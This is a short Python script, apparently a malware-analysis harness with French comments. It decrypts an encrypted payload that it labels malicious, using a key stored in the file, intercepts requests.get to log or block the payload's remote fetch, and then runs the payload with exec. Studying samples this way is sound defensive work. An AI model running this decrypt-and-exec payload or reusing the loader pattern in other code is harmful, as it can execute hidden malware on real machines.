import os
import requests
from fernet import Fernet

# --- 1) Déchiffre le code malveillant ---
key   = b'0mKkGxyqdTZtwW24PAmNW-slDG-vSN-2n4gMoJlXZgU='
cipher = Fernet(key)
encrypted = b'gAAAAABoVFz7ZVmd0lAqMYurxDiRBbuEhel7KyzT8pZMoKKCNrjLi0zE5QyYzbBd8IzVHJ2UVftl6oXc51mkDKEIfH2V0zsby6C30ZpijuUWcBB0tRKZ36W_vOJhtmurbCp0ghIzDbX74oqcpBbwuzPZRv7wMMkm1_DKxLnIaGcQjeytaYOVp9PzO4aYuhm2rm0WmpXUFs8yscyucOFp8lcPkX4Xg8LowuDrUB_1tcdxVZpCNQr4zvo='
payload_code = cipher.decrypt(encrypted).decode('utf-8')

# --- 2) Monkey-patch requests.get ---
orig_get = requests.get
def intercept_get(url, *args, **kwargs):
    print(f"[INTERCEPT] URL demandée : {url}")
    # Option 1 : bloquer la demande et retourner un Dummy vide
    class DummyResponse:
        text = '# Requête bloquée : stub vide'
    return DummyResponse()

    # Option 2 : laisser passer la requête réelle, tout en la journalisant
    # resp = orig_get(url, *args, **kwargs)
    # print(f"[INTERCEPT] HTTP {resp.status_code} – longueur {len(resp.text)} octets")
    # with open('remote_payload.py', 'w', encoding='utf-8') as f:
    #     f.write(resp.text)
    # return resp

requests.get = intercept_get

# --- 3) Exécute le code déchiffré (mais avec notre get intercepté) ---
exec(payload_code)
